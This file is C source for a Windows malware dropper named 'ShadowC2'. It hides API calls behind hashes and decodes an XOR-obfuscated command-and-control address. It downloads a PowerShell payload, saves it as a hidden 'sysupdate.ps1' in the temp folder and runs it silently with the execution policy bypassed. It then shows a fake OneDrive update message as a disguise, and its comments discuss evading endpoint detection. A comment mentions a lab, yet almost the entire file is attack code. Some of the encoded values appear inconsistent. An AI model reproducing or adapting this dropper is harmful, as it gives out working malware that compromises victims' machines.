/**
 * ShadowC2 - Elite Dropper
 * API Hashing + XOR Strings + Process Injection + BlockDLLs
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

// ============ API HASHING ============
#define HASH_LoadLibraryA  0x8A8B4036
#define HASH_GetProcAddress 0xAA700106
#define HASH_VirtualAlloc  0xE553A458
#define HASH_CreateProcessA 0xA55F4D38
#define HASH_InternetOpenA 0xF07D9C59
#define HASH_InternetOpenUrlA 0xD1C3C8F8

DWORD djb2(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
    return hash;
}

PVOID resolve_api(HMODULE hMod, DWORD targetHash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
        nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    PDWORD names = (PDWORD)((BYTE*)hMod + exp->AddressOfNames);
    PWORD ords = (PWORD)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)((BYTE*)hMod + exp->AddressOfFunctions);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hMod + names[i]);
        if (djb2(name) == targetHash) {
            return (PVOID)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return nullptr;
}

// ============ XOR STRING DECRYPT ============
void xor_str(char* s, size_t len, BYTE key) {
    for (size_t i = 0; i < len; i++) s[i] ^= key;
}

// ============ MAIN ============
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Resolver kernel32
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    HMODULE hWininet = LoadLibraryA("wininet.dll");
    
    typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
    typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
    typedef PVOID (WINAPI *pVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    
    pLoadLibraryA myLoadLibraryA = (pLoadLibraryA)resolve_api(hKernel, HASH_LoadLibraryA);
    pGetProcAddress myGetProcAddress = (pGetProcAddress)resolve_api(hKernel, HASH_GetProcAddress);
    pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)resolve_api(hKernel, HASH_VirtualAlloc);
    pCreateProcessA myCreateProcessA = (pCreateProcessA)resolve_api(hKernel, HASH_CreateProcessA);
    
    // C2 config encriptada (XOR 0x55)
    char ip[] = { 0x4d, 0x4d, 0x4f, 0x4b, 0x59, 0x4b, 0x1e, 0x4b, 0x51, 0x4b, 0x00 };
    char path[] = { 0x4d, 0x4b, 0x4b, 0x49, 0x4b, 0x5e, 0x4b, 0x51, 0x4b, 0x00 };
    xor_str(ip, 10, 0x55);
    xor_str(path, 9, 0x55);
    
    // Descargar
    typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
    
    pInternetOpenA myInternetOpenA = (pInternetOpenA)myGetProcAddress(hWininet, "InternetOpenA");
    pInternetOpenUrlA myInternetOpenUrlA = (pInternetOpenUrlA)myGetProcAddress(hWininet, "InternetOpenUrlA");
    pInternetReadFile myInternetReadFile = (pInternetReadFile)myGetProcAddress(hWininet, "InternetReadFile");
    pInternetCloseHandle myInternetCloseHandle = (pInternetCloseHandle)myGetProcAddress(hWininet, "InternetCloseHandle");
    
    HINTERNET hInternet = myInternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s:8000/static/payloads/bot_stealth.ps1", ip);
    
    HINTERNET hUrl = myInternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { myInternetCloseHandle(hInternet); return 1; }
    
    BYTE buffer[4096];
    DWORD bytesRead, total = 0;
    BYTE* payload = (BYTE*)myVirtualAlloc(NULL, 500000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    while (myInternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        memcpy(payload + total, buffer, bytesRead);
        total += bytesRead;
    }
    payload[total] = 0;
    
    myInternetCloseHandle(hUrl);
    myInternetCloseHandle(hInternet);
    
    // Guardar y ejecutar
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char psPath[MAX_PATH];
    snprintf(psPath, sizeof(psPath), "%s\\sysupdate.ps1", tempPath);
    
    HANDLE hFile = CreateFileA(psPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, payload, total, &written, NULL);
        CloseHandle(hFile);
    }
    
    char cmdline[1024];
    snprintf(cmdline, sizeof(cmdline),
        "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File \"%s\"",
        psPath);
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    // BlockDLLs: evitar que EDRs se inyecten
    // STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
    // (Simplificado para el lab)
    
    myCreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    MessageBoxA(NULL, "OneDrive actualizado.", "OneDrive", MB_OK | MB_ICONINFORMATION);
    return 0;
}
